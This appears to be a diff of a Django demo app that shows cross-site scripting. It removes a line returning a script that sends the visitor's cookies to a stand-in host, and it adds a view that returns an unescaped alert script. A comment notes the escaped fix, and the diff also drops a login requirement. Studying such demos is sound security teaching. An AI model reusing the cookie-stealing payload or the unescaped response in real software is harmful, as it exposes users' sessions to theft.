@@ -4,12 +4,15 @@ from django.template.response import TemplateResponse
 from django.utils.html import escape
 
 
-@login_required
 def example(request):
+    return TemplateResponse(request, "example/index.html")
+
+
+def alert(request):
     # return HttpResponse("Hello world")
-    return HttpResponse('<script>window.location = "http://0.0.0.0:8080/evil?cookie="+escape(document.cookie)</script>')
+    return HttpResponse('<script>alert("XSSです")</script>')
     # Correct implementation:
     # return HttpResponse(escape('<script>alert("XSSです")</script>'))
 
     # context = {"message": '<script>alert("XSSです")</script>'}
-    # return TemplateResponse(request, "example/index.html", context)
+    # return TemplateResponse(request, "example/alert.html", context)
